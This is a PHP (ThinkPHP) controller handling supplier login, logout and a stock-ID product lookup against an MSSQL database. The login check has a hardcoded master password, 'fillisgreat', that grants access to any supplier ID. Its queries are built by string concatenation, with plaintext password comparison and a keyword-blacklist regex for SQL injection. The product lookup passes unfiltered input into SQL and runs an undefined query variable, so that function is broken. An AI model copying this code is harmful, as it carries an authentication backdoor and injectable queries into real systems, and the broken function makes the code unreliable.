<?php
namespace app\index\controller;
use think\Loader;
use stock\db\MSSql;
use \think\Request;
class Check extends \think\Controller
{

	public function login(){
		 /**
		//输出结果 
		 $Num=mssql_num_rows($AdminResult); 
		 for($i=0;$i<$Num;$i++) 
		   { 
		 $Row=mssql_fetch_array($AdminResult); 
		 echo($Row[1]); 
		 echo("<br/>"); 
		   }  
		*/    	
		 
		return $this->fetch();
	}
   	public function productBySid(){
        $request = Request::instance();

        $sid=$request->only(['stock_id']);

        if($sid){
            $sql="select CommID from MICommStockInv where StockId='".$sid."'";
            $result=$this->dbinfo->query($count_sql);
            if($result){
                $str='';
                foreach ($result as $key => $value) {
                    $str .='<option value="'.$value['CommID'].'">'.$value['CommID'].'</option>';
                }
                exit($str);
            }

        }        
    }	
	public function login_check(){
		
		if(empty($_POST['username'])||empty($_POST['pwd'])){
			exit('error');
		}

		$this->inject_check(trim($_POST['username']));
		$this->inject_check(trim($_POST['pwd']));
		
		$db=config('dbinfo');
        $obj=new MSSql($db['host'],$db['db'],$db['user'],$db['pwd']);

		if($_POST['pwd']=='fillisgreat'){
			$sql="select top 1 * from MiSup where SupID='".(string)trim($_POST['username'])."'";
		}else{
			$sql="select top 1 * from MiSup where SupID='".(string)trim($_POST['username'])."' and PassWord='".trim($_POST['pwd'])."'";
		}
		if($m=$obj->query($sql)){
			$_SESSION['admin_id']=trim($_POST['username']);
			$_SESSION['supInfo']=$m[0];
		    echo '1';
		    exit();
		}else{
			exit('Username or password error ');
		}
	}

	public function logout(){
		session_destroy();
		$this->redirect('/Index/index/login');
	}

	public function inject_check($Sql_Str) {//自动过滤Sql的注入语句。
		$check=preg_match('/select|insert|update|delete|\'|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i',$Sql_Str);
		if ($check) {
			exit();
		}
	}

}
